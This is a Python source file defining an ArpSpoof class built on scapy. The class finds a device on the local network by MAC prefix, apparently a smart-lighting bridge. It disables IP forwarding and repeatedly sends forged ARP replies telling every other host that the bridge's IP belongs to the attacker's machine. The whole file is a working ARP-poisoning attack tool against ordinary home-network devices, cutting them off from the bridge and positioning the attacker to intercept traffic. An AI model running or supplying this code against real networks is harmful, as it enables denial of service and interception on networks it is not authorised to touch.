from scapy.all import *
from scapy.layers.l2 import Ether, ARP
import os
import re
from uuid import getnode as get_mac
import subprocess
import socket


class ArpSpoof:

    def __init__(self):
        os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')

        test = subprocess.Popen(["arp", "-a"], stdout=subprocess.PIPE)
        output = test.communicate()[0]
        output = output.decode("utf-8").split("\n")
        self.arp_table = {}
        self.ipBridge = ""
        self.macBridge = ""
        self.stop_threads = False

        self.ipAttacker = socket.gethostbyname(socket.gethostname())
        self.macAttacker = ':'.join(("%012X" % get_mac())[i:i + 2] for i in range(0, 12, 2)).lower()
        print(self.macAttacker)

        for row in output:
            ip = re.search('([0-9]{1,3}\.){3}([0-9]{1,3})', row)
            mac = re.search('(([0-9]|[a-f]){2}\:){5}([0-9]|[a-f]){2}', row)
            if ip and mac:
                self.arp_table[ip.group(0)] = mac.group(0)
                if mac.group(0)[:8] == '00:17:88':
                    self.ipBridge = ip.group(0)
                    self.macBridge = mac.group(0)

        self.arp_poisson_packages = []

        for ip, mac in self.arp_table.items():
            if ip != self.ipAttacker:
                arp_poisson_package = Ether() / ARP()

                arp_poisson_package[ARP].hwsrc = self.macAttacker
                arp_poisson_package[ARP].psrc = self.ipBridge
                arp_poisson_package[ARP].pdst = ip
                arp_poisson_package[ARP].op = 2

                self.arp_poisson_packages.append(arp_poisson_package)

    def spoof(self):
        """
        Spoof all devices except the device of the attacker
        """
        step = 0
        while True:
            for arp_poisson in self.arp_poisson_packages:
                sendp(arp_poisson, verbose=0)
            print("step: " + str(step), end="\r")
            step += 1

            if self.stop_threads:
                print('ARP spoofing ended')
                self.reset()
                break

    def reset(self):
        """
        Reset all devices to the good mac address
        """

        for ip, mac in self.arp_table.items():
            if ip != self.ipAttacker:
                arp_poisson_package = Ether() / ARP()
                arp_poisson_package[ARP].hwsrc = self.macBridge
                arp_poisson_package[ARP].psrc = self.ipBridge
                arp_poisson_package[ARP].pdst = ip
                arp_poisson_package[ARP].op = 2

                sendp(arp_poisson_package, verbose=0)
